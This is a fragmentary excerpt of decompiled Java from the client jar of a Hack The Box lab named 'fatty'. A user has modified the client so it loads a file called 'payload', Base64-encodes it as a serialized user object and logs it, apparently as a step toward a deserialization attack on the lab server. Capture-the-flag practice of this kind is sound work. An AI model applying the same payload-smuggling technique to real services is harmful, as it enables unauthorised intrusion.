...
/* 140 */       response = "Unable to convert byte[] to String. Did you read in a binary file?";
        logger.logInfo("writing bytes to out.bin");
...
/*     */     } 
    ...
    byte[] raw = new byte[5555];
    InputStream in = new FileInputStream("payload");
    in.read(raw);
    in.close();

    byte[] serializedUser64 = Base64.getEncoder().encode(raw);


    logger.logInfo(new String(serializedUser64));
...
/* 196 */     if (AccessCheck.checkAccess(methodName, this.user)) {
                logger.logInfo("client error on users");
...
/* Location:              /home/user/htb/labs/main/fatty/exfil/ftp/fatty-client.jar!/htb/fatty/client/methods/Invoker.class
